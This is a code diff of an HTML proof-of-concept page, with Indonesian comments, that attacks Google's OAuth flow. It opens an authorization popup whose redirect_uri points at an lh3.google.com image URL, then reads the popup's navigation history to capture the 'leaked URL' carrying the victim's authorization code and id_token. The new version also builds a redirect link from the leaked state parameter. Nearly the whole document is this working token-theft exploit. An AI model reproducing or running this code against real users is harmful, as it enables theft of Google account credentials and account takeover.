@@ -1,51 +1,32 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Google OAuth Test</title>
-  </head>
+  <head> </head>
   <body>
     <div id="start"></div>
 
     <script>
-      function run(flow) {
-        var win = window.open(
-          `https://accounts.google.com/AccountChooser/signinchooser?continue=https://lh3.google.com/u/0/d/1snA1SLGWmWh5GhDtIulL3Y5BY75CYfOyFiy__dbHgIA=w5000-h5000-p-k-nu&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0`
+      function run() {
+        var win = open(
+          `https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=267669956141-f6kd1f8k228hh186imh1j7gbopgi4ln3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Flh3.google.com%2Fu%2F0%2Fd%2F1snA1SLGWmWh5GhDtIulL3Y5BY75CYfOyFiy__dbHgIA%3Dw5000-h5000-p-k-nu&response_type=code%20id_token&nonce=hej&scope=email%20profile&state=null&service=lso&o2v=2&flowName=GeneralOAuthFlow`
         );
 
         setTimeout(() => {
           try {
-            win.location = "about:blank"; // Mengosongkan halaman
-            setTimeout(() => {
-              if (win.navigation && win.navigation.entries) {
-                const leak = win.navigation.entries()[0]?.url;
-                if (leak) {
-                  console.log("Leaked URL:", leak);
-                  document.body.innerHTML += `<p>Leaked URL: ${leak}</p>`;
-                } else {
-                  console.log("No URL leaked.");
-                  document.body.innerHTML += `<p>No URL leaked.</p>`;
-                }
-              } else {
-                console.log("Navigation API not available.");
-                document.body.innerHTML += `<p>Navigation API not available.</p>`;
-              }
-            }, 2000);
+            // Coba ambil URL terakhir dari window navigation
+            const leak = new URL(win.navigation.entries()[0].url);
+            console.log("Leaked URL:", leak.href);
+
+            const redirectURL = `https://lh3.googleusercontent.com/fife/${leak.searchParams.get("state")}`;
+            document.body.innerHTML += `<p>Redirected to: <a href="${redirectURL}">${redirectURL}</a></p>`;
           } catch (e) {
             console.error("Error:", e);
             document.body.innerHTML += `<p>Error: ${e.message}</p>`;
           }
-        }, 2000);
+        }, 3000);
       }
 
-      const entry = document.getElementById("start");
-      entry.innerHTML = `
-        <button onclick="run('code+id_token&nonce=hej')">
-          Get code and id_token
-        </button>
-        <br/>
-        <button onclick="run('token')">
-          Get Google API token
-        </button>
+      document.getElementById("start").innerHTML = `
+        <button onclick="run()">Login & Redirect</button>
       `;
     </script>
   </body>
